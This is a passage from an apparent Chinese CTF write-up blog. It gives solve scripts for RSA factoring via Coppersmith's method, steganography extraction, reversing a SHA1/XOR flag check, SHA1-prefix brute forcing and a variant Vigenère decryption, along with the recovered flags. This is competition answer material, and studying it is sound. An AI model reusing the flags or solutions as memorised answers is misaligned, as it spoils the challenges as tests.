<span class="hljs-keyword">return</span> <br>        <br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">250</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f = tp + x <br>            rr = f.monic().small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">250</span>, beta=<span class="hljs-number">0.45</span>,epsilon=<span class="hljs-number">0.01</span>)<br>            <span class="hljs-built_in">print</span>(rr)<br>            <span class="hljs-keyword">if</span> rr != []:<br>                <span class="hljs-built_in">print</span>(rr)<br>                <span class="hljs-built_in">print</span>(tp)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#x27;</span>,f(rr[<span class="hljs-number">0</span>]))<br>                ok = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <br>        <span class="hljs-keyword">return</span><br>    <br>    idx -=<span class="hljs-number">1</span><br>    b = (gift &gt;&gt;idx)&amp;<span class="hljs-number">1</span><br>    one = <span class="hljs-number">1</span>&lt;&lt;idx <br>    <span class="hljs-keyword">if</span> b==<span class="hljs-number">0</span>:<br>        pq_xor(tp,tq,idx)    <br>        pq_xor(tp+one,tq+one,idx)    <br>    <span class="hljs-keyword">else</span>:   <span class="hljs-comment">#1</span><br>        pq_xor(tp+one,tq,idx)<br>        pq_xor(tp,tq+one,idx)<br><br>tp = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>tq = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>pq_xor(tp,tq,<span class="hljs-number">511</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">6814449132912466352143200200256605077873329465758477832056090562012411200107156482645933890997787435093806046493913273252717701817613907418845774345791241</span><br>q = <span class="hljs-number">10833217580503000698385694268032196544400600307706228180481286239545614448110770843300361411809086269809006469621399256214887200838529724133384063799751203</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">71808322808599218331233291542779486534747913572475630198802984648982830332628443972652322590637382696027943799004331488098592525306523343649935216419522329722152742610560398216737030893090641493326477786720839849938277402743820773957184083430369443325368720115515840174745825798187125454448297155036065857691</span><br>n = p*q<br>phi = (q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)<br>d = inverse(e, phi) <br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#flag&#123;6eb67115-38b1-4e75-b3fc-de3a9697e565&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="我的壁纸"><a href="#我的壁纸" class="headerlink" title="我的壁纸"></a>我的壁纸</h2><p>foremost分出三个文件<br>对flag.txt解snow隐写 key在jpg文件尾；flag.wav解SSTV；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf youshouldknowme.jpeg -p 7hR@1nB0$&amp;<br><br><span class="hljs-built_in">cat</span> flag.txt<br><br>flag&#123;b921323f-<br></code></pre></td></tr></table></figure><p><code>flag&#123;b921323f-eaa2-4d62-ace6-f86361842eb8&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>鹏城杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023网信柏鹭杯</title>
    <link href="/2023/10/11/2023%E7%BD%91%E4%BF%A1%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/11/2023%E7%BD%91%E4%BF%A1%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="imm"><a href="#imm" class="headerlink" title="imm"></a>imm</h4><p>关键函数<code>sub_415190</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> __fastcall <span class="hljs-title function_">sub_415190</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span><br>&#123;<br>    <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebp</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// esi</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// edi</span><br>    <span class="hljs-type">char</span> v5; <span class="hljs-comment">// al</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// ecx</span><br>    <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// ecx</span><br>    <span class="hljs-type">char</span> *v8; <span class="hljs-comment">// edx</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9; <span class="hljs-comment">// esi</span><br>    <span class="hljs-type">bool</span> v14; <span class="hljs-comment">// cf</span><br>    <span class="hljs-type">char</span> v16[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-B0h] [ebp-BCh]</span><br>    <span class="hljs-type">char</span> v18[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp-84h] [ebp-90h] BYREF</span><br>    <span class="hljs-type">char</span> v19[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-80h] [ebp-8Ch] BYREF</span><br>    <span class="hljs-type">int</span> v20; <span class="hljs-comment">// [esp-60h] [ebp-6Ch]</span><br>    <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [esp-5Ch] [ebp-68h]</span><br>    <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [esp-58h] [ebp-64h]</span><br>    <span class="hljs-type">int</span> v23; <span class="hljs-comment">// [esp-54h] [ebp-60h]</span><br>    <span class="hljs-type">int</span> v24; <span class="hljs-comment">// [esp-50h] [ebp-5Ch]</span><br>    <span class="hljs-type">int</span> v25; <span class="hljs-comment">// [esp-4Ch] [ebp-58h]</span><br>    <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [esp-48h] [ebp-54h]</span><br>    <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [esp-44h] [ebp-50h]</span><br>    <span class="hljs-type">char</span> v28[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-40h] [ebp-4Ch]</span><br>    <span class="hljs-type">char</span> v29[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-20h] [ebp-2Ch] BYREF</span><br>    _DWORD v30[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [esp+0h] [ebp-Ch] BYREF</span><br>    <span class="hljs-type">void</span> *retaddr; <span class="hljs-comment">// [esp+Ch] [ebp+0h]</span><br><br>    v30[<span class="hljs-number">0</span>] = v1;<br>    v30[<span class="hljs-number">1</span>] = retaddr;<br>    _EBP = v30;<br>    *(_OWORD *)v16 = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)&amp;v16[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)v29 = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)&amp;v29[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>i64;<br>    *(_DWORD *)v19 = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">4</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">8</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">12</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">16</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">20</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">24</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">28</span>] = <span class="hljs-number">-1</span>;<br>    v3 = <span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0x40</span> )<br>    &#123;<br>        v4 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( *(_DWORD *)v18 = <span class="hljs-number">0</span>; v4 &lt; v3; v16[v6] = v5 )<br>        &#123;<br>            v18[<span class="hljs-number">0</span>] = s[v4];<br>            v18[<span class="hljs-number">1</span>] = s[v4 + <span class="hljs-number">1</span>];<br>            v5 = strtol(v18, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>            v6 = v4 &gt;&gt; <span class="hljs-number">1</span>;<br>            v4 += <span class="hljs-number">2</span>;<br>        &#125;<br>    &#125;<br>    *(_DWORD *)v28 = <span class="hljs-number">0x765EEBCD</span>;<br>    v7 = v29;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">4</span>] = <span class="hljs-number">0x31AF220F</span>;<br>    v8 = v19;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">8</span>] = <span class="hljs-number">0xEF3C9282</span>;<br>    v9 = <span class="hljs-number">28</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">12</span>] = <span class="hljs-number">0x676C1B8</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">16</span>] = <span class="hljs-number">0x7DB52F18</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">20</span>] = <span class="hljs-number">0x85EA0A7F</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">24</span>] = <span class="hljs-number">0xA3890092</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">28</span>] = <span class="hljs-number">0x32E7E22C</span>;<br>    __asm<br>    &#123;<br>        vmovdqu ymm0, ymmword ptr [ebp<span class="hljs-number">-40</span>h]<br>            vpxor   ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-0B</span>0h]<br>        &#125;<br>    v20 = <span class="hljs-number">0xE06070A</span>;<br>    v21 = <span class="hljs-number">0xD030B02</span>;<br>    v22 = <span class="hljs-number">0x5000901</span>;<br>    v23 = <span class="hljs-number">0xC080F04</span>;<br>    v24 = <span class="hljs-number">0x1F17181B</span>;<br>    v25 = <span class="hljs-number">0x13121E14</span>;<br>    v26 = <span class="hljs-number">0x1C161D15</span>;<br>    v27 = <span class="hljs-number">0x1A191011</span>;<br>    __asm &#123; vpshufb ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-60</span>h] &#125;<br>    *(_DWORD *)v29 = <span class="hljs-number">0xE899915F</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">4</span>] = <span class="hljs-number">0x92B0D04E</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">8</span>] = <span class="hljs-number">0xF44F3CB1</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">12</span>] = <span class="hljs-number">0x12DA7617</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">16</span>] = <span class="hljs-number">0x1501352A</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">20</span>] = <span class="hljs-number">0x195E97F9</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">24</span>] = <span class="hljs-number">0x9915C29D</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">28</span>] = <span class="hljs-number">0xCC9F7D70</span>;<br>    __asm<br>    &#123;<br>        vpcmpeqb ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-20</span>h]<br>            vmovdqu ymmword ptr [ebp<span class="hljs-number">-20</span>h], ymm0<br>            vzeroupper<br>        &#125;<br>    <span class="hljs-keyword">while</span> ( *(_DWORD *)v7 == *(_DWORD *)v8 )<br>    &#123;<br>        v7 += <span class="hljs-number">4</span>;<br>        v8 += <span class="hljs-number">4</span>;<br>        v14 = v9 &lt; <span class="hljs-number">4</span>;<br>        v9 -= <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">if</span> ( v14 )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>手动识别sha1,然后有个xor,乱序,提取反过来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">msg = [<span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x92</span>,<br>       <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x7D</span>,<br>       <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xE2</span>,<br>       <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x32</span>]<br>index_ = [<span class="hljs-number">0x0A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x09</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1F</span>,<br>          <span class="hljs-number">0x14</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>,<br>          <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>]<br>des = [<span class="hljs-number">0x5F</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x3C</span>,<br>       <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x15</span>,<br>       <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7D</span>,<br>       <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xCC</span>]<br>des2 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des2.append(des[index_[i]])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>des3 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des3.append(des[index_.index(i)])<br><br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des3:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    des3[i] ^= msg[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> des3:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].upper(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">4F92B0DA99F4E876913C5FD04E12B117999D19CCF99F115977D5E70352AC215</span><br><span class="hljs-string">4FB14EB017F49991DA3C5FD01292E8767D705E19F99D151359FCC2A99C29715</span><br><span class="hljs-string">825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>运行程序，输入字符串就可以拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Input your code: 825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027<br>Your Flag is: flagfISEC-a49d6b847bdba62c5bfa0a43b69c85753<br></code></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h4><p>爆破sha1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><br>sha1 = <span class="hljs-string">&quot;8c36e4?c1d294?df5bb7a9b?b8bd2d2?f22c1f?9&quot;</span><br>dic = string.printable<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> dic:<br>                pw = <span class="hljs-string">f&#x27;i<span class="hljs-subst">&#123;i&#125;</span>Bgt<span class="hljs-subst">&#123;j&#125;</span>_Ld<span class="hljs-subst">&#123;k&#125;</span>s<span class="hljs-subst">&#123;l&#125;</span>6c9&#x27;</span><br>                sha11 = hashlib.sha1(pw.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> sha11[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == sha1[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]:<br>                    <span class="hljs-built_in">print</span>(pw, sha11)<br>                  <br><span class="hljs-comment"># idBgtV_Ld&#123;sE6c9 8c36e414229315b89bfb39279fb2591cf474a188</span><br><span class="hljs-comment"># ifBgtd_LdTs+6c9 8c36e41f5c5c73579aec0cfb5bd99436606768f1</span><br><span class="hljs-comment"># ihBgtc_LdUs&#123;6c9 8c36e46ea808b38b56c3a676c296226219243353</span><br><span class="hljs-comment"># ikBgtm_Ld*s46c9 8c36e4a43c55291fd0273356c7259c9fc99fc167</span><br><span class="hljs-comment"># ilBgt0_Ldzsp6c9 8c36e4eea79d01bdb59b9f15323e652a278eceb0</span><br><span class="hljs-comment"># ipBgt&lt;_Ld)sa6c9 8c36e4a7ca1e295fb174fe8b215d126a944d4f4d</span><br><span class="hljs-comment"># iZBgtZ_Ldqs;6c9 8c36e471073904d2ba3e3a66c80899893dbbe27d</span><br><span class="hljs-comment"># i&#123;Bgt)_Ldxs56c9 8c36e4637aad2cc5b043fa277efcefe3f35f280d</span><br><span class="hljs-comment"># i&#125;Bgt,_Ld9s96c9 8c36e4c30ba623f0c7c1bcdf6e9073cddb462cc6</span><br><span class="hljs-comment"># i~Bgto_Ldes     6c9 8c36e463691b8d473455e2914ff623f6e962c7ed</span><br><span class="hljs-comment"># i~BgtN_Ld@sw6c9 8c36e45c1d2949df5bb7a9bfb8bd2d24f22c1f49</span><br></code></pre></td></tr></table></figure><p>压缩包爆破得到第二层密码ROT47</p><p>结合密码对密码解ROT47得到密文</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-number">6</span>JnsNxHKJ8mkvhS&#123;<span class="hljs-keyword">rMO_c9apMfHDHObq80PMu</span>&#123;<span class="hljs-keyword">_ww_r</span>&#123;rq<br></code></pre></td></tr></table></figure><p>变表vigenere，参考<a href="https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/crypto_vigenere">ctf/2017-12-09-seccon-quals/crypto_vigenere at master · p4-team/ctf</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_l</span>(<span class="hljs-params">idx, s</span>):<br>    <span class="hljs-keyword">return</span> s[idx:] + s[:idx]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">p, k1, k2</span>):<br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    t = [[_l((i+j) % <span class="hljs-built_in">len</span>(s), s) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))]<br>    i1 = <span class="hljs-number">0</span><br>    i2 = <span class="hljs-number">0</span><br>    c = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> p:<br>        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]<br>        i1 = (i1 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k1)<br>        i2 = (i2 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k2)<br>    <span class="hljs-keyword">return</span> c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ct, k1, k2</span>):<br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    t = [[_l((i + j) % <span class="hljs-built_in">len</span>(s), s) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))]<br>    i1 = <span class="hljs-number">0</span><br>    i2 = <span class="hljs-number">0</span><br>    decrypted = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ct:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">if</span> t[s.find(c)][s.find(k1[i1])][s.find(k2[i2])] == a:<br>                decrypted += c<br>                <span class="hljs-keyword">break</span><br>        i1 = (i1 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k1)<br>        i2 = (i2 + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(k2)<br>    <span class="hljs-keyword">return</span> decrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_key</span>(<span class="hljs-params">known_prefix, ciphertex</span>):<br>    final_key = [<span class="hljs-string">&#x27;*&#x27;</span>] * <span class="hljs-number">20</span><br>    s = <span class="hljs-string">&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;</span><br>    <span 